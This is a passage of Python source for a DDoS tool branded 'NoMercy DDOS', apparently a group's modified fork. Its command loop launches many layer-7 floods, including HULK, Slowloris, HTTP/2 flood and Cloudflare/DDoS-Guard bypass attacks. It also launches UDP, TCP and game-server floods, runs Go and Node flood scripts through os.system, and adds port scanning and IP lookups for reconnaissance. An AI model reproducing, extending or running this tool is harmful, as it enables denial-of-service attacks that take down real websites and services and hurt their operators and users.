    stdout.write(" "+Fore.LIGHTBLUE_EX +"  ║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"PORTCHECK "+Fore.LIGHTBLUE_EX+"|"+Fore.LIGHTWHITE_EX+" Open Port Checker"+Fore.LIGHTBLUE_EX+"                   ║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX +"  ║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"geoip     "+Fore.LIGHTBLUE_EX+"|"+Fore.LIGHTWHITE_EX+" Geo IP Address Lookup"+Fore.LIGHTBLUE_EX+"               ║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX +"  ║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"dns       "+Fore.LIGHTBLUE_EX+"|"+Fore.LIGHTWHITE_EX+" Classic DNS Lookup"+Fore.LIGHTBLUE_EX+"                  ║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX +"  ║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"subnet    "+Fore.LIGHTBLUE_EX+"|"+Fore.LIGHTWHITE_EX+" Subnet IP Address Lookup"+Fore.LIGHTBLUE_EX+"            ║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX +"  ╚═══════════════════════════════════════════════╝\n")
    stdout.write("\n")

##############################################################################################
def title():
    stdout.write("                                                                                   \n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +" ███╗   ██╗ ██████╗ ███╗   ███╗███████╗██████╗  ██████ ██╗   ██╗     ██████╗ ██████╗  ██████╗ ███████╗ \n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +" ████╗  ██║██╔═══██╗████╗ ████║██╔════╝██╔══██╗██╔════ ╚██╗ ██╔╝     ██╔══██╗██╔══██╗██╔═══██╗██╔════╝ \n")
    stdout.write(" "+Fore.LIGHTWHITE_EX +" ██╔██╗ ██║██║   ██║██╔████╔██║█████╗  ██████╔╝██║      ╚████╔╝      ██║  ██║██║  ██║██║   ██║███████╗ \n")
    stdout.write(" "+Fore.LIGHTWHITE_EX +" ██║╚██╗██║██║   ██║██║╚██╔╝██║██╔══╝  ██╔══██╗██║       ╚██╔╝       ██║  ██║██║  ██║██║   ██║╚════██║ \n")
    stdout.write(" "+Fore.LIGHTWHITE_EX +" ██║ ╚████║╚██████╔╝██║ ╚═╝ ██║███████╗██║  ██║╚██████    ██║        ██████╔╝██████╔╝╚██████╔╝███████║ \n")
    stdout.write(" "+Fore.LIGHTWHITE_EX +" ╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝   ╚═╝        ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝ \n")
    stdout.write("                                                                                   \n")
    stdout.write(" "+Fore.LIGHTBLUE_EX +"        ══╦═══════════════════════════════════╦══\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX +"╔═════════╩═══════════════════════════════════╩═════════╗\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX +"║ "+Fore.LIGHTWHITE_EX +"Herramienta DDoS ======>>>>>>La herramienta modificada por ZuT "+Fore.LIGHTBLUE_EX  +"  ║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX +"║ "+Fore.LIGHTWHITE_EX +"¡¡¡USO SÓLO PARA GRUPO NoMercy!!!!         "+Fore.LIGHTBLUE_EX  +"  ║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX +"║ "+Fore.LIGHTWHITE_EX +"Para contacto buscanos                        "+Fore.LIGHTBLUE_EX  +"  ║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX +"╚═══════════════════════════════════════════════════════╝\n")
    stdout.write("\n")

##############################################################################################
def command():
    stdout.write(Fore.LIGHTBLUE_EX+"╔══O00000000000000"+Fore.LIGHTBLUE_EX+"["" ~ADMIN~ "+Fore.LIGHTBLUE_EX+" @"+Fore.LIGHTBLUE_EX+" NoMercy-TEAM "+Fore.CYAN+"]"+Fore.LIGHTBLUE_EX+"\n╚═>>>\x1b[38;2;0;255;189m> "+Fore.WHITE)
    command = input()
    if command == "cls" or command == "clear":
        clear()
        title()
    elif command == "help" or command == "?":
        help()
    elif command == "credit":
        credit()
    elif command == "layer71" or command == "LAYER71" or command == "l71" or command == "L71" or command == "Layer71":
        layer7_1()
    elif command == "layer72" or command == "LAYER72" or command == "l72" or command == "L72" or command == "Layer72":
        layer7_2()
    elif command == "layer4" or command == "LAYER4" or command == "l4" or command == "L4" or command == "Layer4":
        layer4()
    elif command == "tools" or command == "tool":
        tools()
    elif command == "exit":
        exit()
    elif command == "test":
        target, thread, t = get_info_l7()
        Launch(target, thread, t, "HEAD")
        time.sleep(10)
    elif command == "cfb" or command == "CFB":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchCFB(target, thread, t)
        timer.join()
    elif command == "pxcfb" or command == "PXCFB":
        target, thread, t = get_info_l7()
        threading.Thread(target=attackPXCFB, args=(target, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif command == "get" or command == "GET":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchRAW(target, thread, t)
        timer.join()
    elif command == "post" or command == "POST":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchPOST(target, thread, t)
        timer.join()
    elif command == "head" or command == "HEAD":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchHEAD(target, thread, t)
        timer.join()
    elif command == "pxraw" or command == "PXRAW":
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXRAW(target, thread, t)
            timer.join()
    elif command == "soc" or command == "SOC":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchSOC(target, thread, t)
        timer.join()
    elif command == "hulk" or command == "HULK":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchHULK(target, thread, t)
        timer.join()
    elif command == "pxhulk" or command == "PXHULK":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        attackPXHULK(target, thread, t)
        timer.join()
    elif command == "pxsoc" or command == "PXSOC":
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXSOC(target, thread, t)
            timer.join()
    elif command == "cfpro" or command == "CFPRO":
        target, thread, t = get_info_l7()
        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
        if get_cookie(target):
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchCFPRO(target, thread, t)
            timer.join()
        else:
            stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass cf\n")
    elif command == "cfsoc" or command == "CFSOC":
        target, thread, t = get_info_l7()
        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
        if get_cookie(target):
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchCFSOC(target, thread, t)
            timer.join()
        else:
            stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass cf\n")
    elif command == "attack":
        target, thread, t = get_info_l7()
        threading.Thread(target=attackSKY, args=(target, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif command == "spoof":
        target, thread, t = get_info_l7()
        threading.Thread(target=attackspoof, args=(target, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif command == "bypass":
        target, thread, t = get_info_l7()
        threading.Thread(target=attackbypass, args=(target, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif command == "pxslow":
        target, thread, t = get_info_l7()
        threading.Thread(target=attackslow, args=(target, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif command == "http2":
        target, thread, t = get_info_l7()
        threading.Thread(target=attackhttp2, args=(target, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif command == "stellar":
        target, thread, t = get_info_l7()
        threading.Thread(target=attackSTELLAR, args=(target, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif command == "strike":
        target, thread, t = get_info_l7()
        threading.Thread(target=LaunchStrike, args=(target, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()

    elif command == "udp" or command == "UDP":
        target, port, thread, t = get_info_l4()
        threading.Thread(target=runsender, args=(target, port, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif command == "tcp" or command == "TCP":
        target, port, thread, t = get_info_l4()
        threading.Thread(target=runflooder, args=(target, port, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif command == "mine" or command == "MINE":
        target, port, thread, t = get_info_l4()
        threading.Thread(target=runmine, args=(target, port, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif command == "vse" or command == "VSE":
        target, port, thread, t = get_info_l4()
        threading.Thread(target=runvse, args=(target, port, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    
    elif command == "hulk2" or command == "HULK2":
        try:
            target, thread, t = get_info_l7()
            os.system(f'cd godzilla && go run Hulk.go -site {target} -data GET')
            #os.system(f'cd godzilla && go run strike.go -url [url] -method GET')
            #os.system(f'cd godzilla && go run CTA.go -site {url} -data GET')
            #os.system(f'cd godzilla && go run XCDDOS.go -site {url} -data GET')
            #os.system(f'cd godzilla && go run Low.go -site {url} -data GET')
            #os.system("clear")
        except IndexError:
            print('comprobar de nuevo')
            print('Complete todas las preguntas correctamente.')
            
    elif command == "TLZ" or command == "tlz" :
        try:
            target, thread, t = get_info_l7()  
            os.system(f'cd godzilla && go run TLZ.go -url {target} GET')
        except IndexError:
            print('comprobar de nuevo')
            print('Complete todas las preguntas correctamente.')

    elif command == "HTTPFLOOD" or command == "httpflood" :
        try:
            target, thread, methode, t = get_info_l72()    
            os.system(f'cd godzilla && go run httpflood.go {target} {thread} {methode} {t} nil')
        except IndexError:
            print('comprobar de nuevo')
            print('llenar el método con get/post')

    elif command == "HTTP-RAND" or command == "http-rand" :
        try:
            target, thread, t = get_info_l7()    
            os.system(f'cd godzilla && node HTTP-RAND.js {target} {t}')
        except IndexError:
            print('comprobar de nuevo')
            print('Complete todas las preguntas correctamente.')

    elif command == "HTTPS2" or command == "https2" :
        try:
            target, thread, t = get_info_l7()
            os.system(f'cd godzilla && go run XCDDOS.go -site {target} -data GET')
            os.system(f'cd godzilla && go run CTA.go -site {target} -data GET')
            os.system(f'cd godzilla && go run Hulk.go -site {target} -data GET')
            os.system(f'cd godzilla && go run strike.go -url [target] -method GET')
            os.system(f'cd godzilla && go run Low.go -site {target} -data GET')
            os.system("clear")
        except IndexError:
            print('comprobar de nuevo')
            print('Complete todas las preguntas correctamente.')




##############################################################################################

    elif command == "PORTCHECK" or command == "portcheck":
        stdout.write(Fore.MAGENTA + " [>] " + Fore.WHITE + "DOMAIN/IP " + Fore.LIGHTBLUE_EX + ": " + Fore.LIGHTBLUE_EX)
        target = input()

        if target:
            target = target.replace('https://', '').replace('http://', '')
            if "/" in target:
                target = target.split("/")[0]

            print('please wait ...', end="\r")

            try:
                # Initialize nmap scanner
                nm = nmap.PortScanner()

                # Specify the ports to scan
                ports_to_scan = ','.join(map(str, common_ports.keys()))

                # Perform the scan with the --unprivileged option
                nm.scan(target, ports_to_scan, arguments="--unprivileged")

                # Ensure the target was scanned successfully
                if target not in nm.all_hosts():
                    raise Exception(f"Failed to scan {target}. It may not be reachable or resolvable.")

                # Check for open ports and print results
                open_ports = []
                for port in common_ports.keys():
                    if nm[target].has_tcp(port) and nm[target]['tcp'][port]['state'] == 'open':
                        open_ports.append((port, common_ports[port]))

                if open_ports:
                    print(f"Open Ports on {target}:")
                    for port, service in open_ports:
                        print(f"Port {port} ({service}) is OPEN")
                else:
                    print(f"No commonly used ports are open on {target}")
            except nmap.PortScannerError as e:
                print(f"An error occurred with nmap: {str(e)}")
            except Exception as e:
                print(f"An error occurred: {str(e)}")



    elif command == "CHECK" or command == "check":
        stdout.write(Fore.MAGENTA + " [>] " + Fore.WHITE + "DOMAIN " + Fore.LIGHTBLUE_EX + ": " + Fore.LIGHTBLUE_EX)
        target = input()
        if target:
            try:
                print("Please wait ...")
                r = get(target, timeout=20)
                print(('status_code: %d\n'
                    'status: %s') %
                    (r.status_code, "ONLINE"
                    if r.status_code <= 500 else "OFFLINE"))
            except Exception as e:
                print(f"Error occurred: {str(e)}")

    elif command == "INFO" or command == "info":
        stdout.write(Fore.MAGENTA + " [>] " + Fore.WHITE + "DOMAIN " + Fore.LIGHTBLUE_EX + ": " + Fore.LIGHTBLUE_EX)
        target = input()

        if target:
            target = target.replace('https://', '').replace('http://', '')
            if "/" in target:
                target = target.split("/")[0]

            print('please wait ...', end="\r")

            try:
                info_data = info(target)

                if not info_data.get("success"):
                    print(f"Error fetching domain information! {info_data.get('error', '')}")
                    return  # Exit early if the information fetch failed

                print(("Country: %s\n"
                    "City: %s\n"
                    "Org: %s\n"
                    "Isp: %s\n"
                    "Region: %s\n") %
                    (info_data.get("country", "N/A"),
                    info_data.get("city", "N/A"),
                    info_data.get("org", "N/A"),
                    info_data.get("isp", "N/A"),
                    info_data.get("region", "N/A")))
            except Exception as e:
                print(f"An error occurred: {str(e)}")

    elif command == "PING" or command == "ping":
        stdout.write(Fore.MAGENTA + " [>] " + Fore.WHITE + "DOMAIN " + Fore.LIGHTBLUE_EX + ": " + Fore.LIGHTBLUE_EX)
        target = input()

        if target:
            target = target.replace('https://', '').replace('http://', '')
            if "/" in target:
                target = target.split("/")[0]

            print('please wait ...', end="\r")

            try:
                # Perform the ping operation
                r = ping(target, count=5, interval=0.2)

                # Log the results
                print(('Address: %s\n'
                            'Ping: %d ms\n'
                            'Accepted Packets: %d/%d\n'
                            'Status: %s\n') %
                            (r.address, r.avg_rtt, r.packets_received,
                            r.packets_sent,
                            "ONLINE" if r.is_alive else "OFFLINE"))
            except Exception as e:
                print(f"An error occurred: {str(e)}")



    elif command == "DSTAT" or command == "dstat":
        with suppress(KeyboardInterrupt):
            ld = net_io_counters(pernic=False)

            while True:
                time.sleep(1)

                od = ld
                ld = net_io_counters(pernic=False)

                t = [(last - now) for now, last in zip(od, ld)]

                print(
                    ("Bytes Sent %s\n"
                    "Bytes Received %s\n"
                    "Packets Sent %s\n"
                    "Packets Received %s\n"
                    "ErrIn %s\n"
                    "ErrOut %s\n"
                    "DropIn %s\n"
                    "DropOut %s\n"
                    "Cpu Usage %s\n"
                    "Memory %s\n") %
                    (humanbytes(t[0]), humanbytes(t[1]),
                    humanformat(t[2]), humanformat(t[3]),
                    t[4], t[5], t[6], t[7], str(cpu_percent()) + "%",
                    str(virtual_memory().percent) + "%"))


    elif command == "subnet":
        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"IP "+Fore.LIGHTBLUE_EX+": "+Fore.LIGHTBLUE_EX)
        target = input()
        try:
            r = requests.get(f"https://api.hackertarget.com/subnetcalc/?q={target}")
            print(r.text)
        except:
            print('An error has occurred while sending the request to the API!')

    elif command == "dns":
        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"IP/DOMAIN "+Fore.LIGHTBLUE_EX+": "+Fore.LIGHTBLUE_EX)
        target = input()
        try:
            r = requests.get(f"https://api.hackertarget.com/reversedns/?q={target}")
            print(r.text)
        except:
            print('An error has occurred while sending the request to the API!')

    elif command == "geoip":
        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"IP "+Fore.LIGHTBLUE_EX+": "+Fore.LIGHTBLUE_EX)
        target = input()
        try:
            r = requests.get(f"https://api.hackertarget.com/geoip/?q={target}")
            print(r.text)
        except:
            print('An error has occurred while sending the request to the API!')
    else:
        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"Unknown command. type 'help' to see all commands.\n")


##############################################################################################

def func():
    stdout.write(Fore.RED+" [\x1b[38;2;0;255;189mLAYER 7"+Fore.RED+"]\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"spoof      "+Fore.RED+": "+Fore.WHITE+"spoof X-forward attack with socks5\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"cfb        "+Fore.RED+": "+Fore.WHITE+"Bypass CF attack\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxcfb      "+Fore.RED+": "+Fore.WHITE+"Bypass CF attack with proxy\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"cfpro      "+Fore.RED+": "+Fore.WHITE+"Bypass CF UAM, CF CAPTCHA, CF BFM, CF JS (request)\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"cfsoc      "+Fore.RED+": "+Fore.WHITE+"Bypass CF UAM, CF CAPTCHA, CF BFM, CF JS (socket)\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"attack     "+Fore.RED+": "+Fore.WHITE+"HTTPS Flood and bypass for CF NoSec, DDoS Guard Free and vShield with sock5\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"stellar    "+Fore.RED+": "+Fore.WHITE+"HTTPS Sky Attack method without proxies\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"bypass     "+Fore.RED+": "+Fore.WHITE+"HTTPS method without proxies  bypass Google Shield, VShield\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"raw        "+Fore.RED+": "+Fore.WHITE+"Request attack\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"post       "+Fore.RED+": "+Fore.WHITE+"Post Request attack\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"head       "+Fore.RED+": "+Fore.WHITE+"Head Request attack\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"soc        "+Fore.RED+": "+Fore.WHITE+"Socket attack\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"hulk       "+Fore.RED+": "+Fore.WHITE+"HULK - HTTP Unbearable Load King\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxhulk     "+Fore.RED+": "+Fore.WHITE+"proxyHULK HTTP Unbearable Load King\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxraw      "+Fore.RED+": "+Fore.WHITE+"Proxy Request attack\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxsoc      "+Fore.RED+": "+Fore.WHITE+"Proxy Socket attack\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxslow     "+Fore.RED+": "+Fore.WHITE+"Proxy Slowloris attack\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"http2      "+Fore.RED+": "+Fore.WHITE+"HTTP/2.0 Flood\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"slowread   "+Fore.RED+": "+Fore.WHITE+"Slowread dos.Slowhttptest\n")

    stdout.write(Fore.RED+"  \n["+Fore.WHITE+"LAYER 4"+Fore.RED+"]\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"tcp        "+Fore.RED+": "+Fore.WHITE+"Strong TCP attack (not supported)\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"udp        "+Fore.RED+": "+Fore.WHITE+"Strong UDP attack (not supported)\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"mine        "+Fore.RED+": "+Fore.WHITE+"minecraft disconnect login DOS (not supported)\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"vse        "+Fore.RED+": "+Fore.WHITE+"Send Valve Source Engine Protocol\n")

    stdout.write(Fore.RED+" \n[\x1b[38;2;0;255;189mTOOLS"+Fore.RED+"]\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"dns        "+Fore.RED+": "+Fore.WHITE+"Classic DNS Lookup\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"geoip      "+Fore.RED+": "+Fore.WHITE+"Geo IP Address Lookup\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"subnet     "+Fore.RED+": "+Fore.WHITE+"Subnet IP Address Lookup\n")

    stdout.write(Fore.RED+" \n[\x1b[38;2;0;255;189mOTHER"+Fore.RED+"]\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"clear/cls  "+Fore.RED+": "+Fore.WHITE+"Clear console\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"exit       "+Fore.RED+": "+Fore.WHITE+"Bye..\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"credit     "+Fore.RED+": "+Fore.WHITE+"Thanks for\n")


def login():
    os.system("clear")
    user = ""
    passwd = ""
    username = input("""



    ⚡ \33[0;32mLOGIN TO NOMERCY DDOS : """)
    password = getpass.getpass(prompt="""
    ⚡ \33[0;32mPASSWORDS       : """)
    if username != user or password != passwd:
        print("")
        print(f"""
       ☠️ \033[1;31;40mCARGANDO""")
        time.sleep(0.6)
        sys.exit(1)
    elif username == user and password == passwd:
        print("""
        POR FAVOR ESPERE UN MOMENTO...""")
        time.sleep(0.6)
        clear()
        print("""
        POR FAVOR ESPERE UN MOMENTO...""")
        clear()
        time.sleep(0.6)
        print("""
    ⚡ \33[0;32mBIENVENIDO A NOMERCY DDOS por ZuT""")
        time.sleep(2.6)
        clear()
        title()
        while True:
            command()

login()
